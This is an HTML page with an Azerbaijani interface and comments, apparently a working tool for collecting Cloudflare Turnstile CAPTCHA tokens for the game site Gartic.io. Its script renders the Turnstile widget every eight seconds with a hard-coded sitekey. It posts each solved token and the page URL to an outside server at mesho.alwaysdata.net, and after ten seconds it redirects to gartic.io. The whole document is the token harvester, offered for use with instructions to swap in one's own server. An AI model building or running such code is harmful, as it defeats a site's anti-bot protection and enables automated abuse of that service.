l<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <title>Token Toplama Test (Gartic.io)</title>
  <style>
    body { margin:0; height:100vh; background:#111; color:#fff; font-family:Arial; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
    h1 { color:#ff4444; font-size:3rem; }
    #status { font-size:1.3rem; margin:1rem; color:#ffcc00; }
  </style>
</head>
<body>
  <h1>Gartic.io Token Toplayıcı</h1>
  <div id="status">Token axtarılır... (Gartic.io-da CAPTCHA yoxdursa işləməyəcək)</div>

  <script>
    const STATUS = document.getElementById('status');
    const TOKEN_INTERVAL = 8000; // 8 saniyədən bir cəhd (çox tez olmasın)

    function tryGetToken() {
      STATUS.textContent = 'Turnstile yüklənir...';

      // Real sitekey tapılmayıb – test üçün ümumi istifadə olunur, amma Gartic.io-da işləmir
      const sitekey = '0x4AAAAAABBPKaIbNwnPEfSo'; // ← buranı dəyişmək lazımdır (real olarsa)

      window.turnstile?.render(document.body, {
        sitekey: sitekey,
        appearance: 'always',
        callback: function(token) {
          STATUS.textContent = 'Token alındı! Göndərilir...';
          console.log('Token:', token);

          // Serverə göndər (öz serverini qoy)
          fetch('https://mesho.alwaysdata.net/add-token', {  // ← buranı öz serverinlə əvəz et
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, url: location.href })
          })
          .then(r => r.json())
          .then(d => { STATUS.textContent = 'Uğurlu! Server cavabı: ' + JSON.stringify(d); })
          .catch(e => { STATUS.textContent = 'Xəta: ' + e; console.error(e); });
        },
        'error-callback': function(err) {
          STATUS.textContent = 'Xəta: ' + (err || 'Widget yüklənmədi – sitekey yanlış ola bilər');
          console.error('Turnstile xətası:', err);
        }
      });
    }

    // İlk cəhd
    if (window.turnstile) {
      tryGetToken();
    } else {
      // Turnstile script-i yüklə (əgər səhifədə yoxdursa)
      const script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';
      script.async = true;
      script.defer = true;
      document.head.appendChild(script);

      window.onTurnstileLoad = function () {
        STATUS.textContent = 'Turnstile hazır – cəhd edilir';
        tryGetToken();
      };
    }

    // Təkrar cəhdlər
    setInterval(() => {
      if (document.querySelector('.cf-turnstile')) return; // artıq varsa təkrar etmə
      tryGetToken();
    }, TOKEN_INTERVAL);

    // 10 saniyədən sonra Gartic.io-ya keç (istəyə görə sil bilərsən)
    setTimeout(() => {
      window.location.href = 'https://gartic.io';
    }, 10000);
  </script>
</body>
</html>
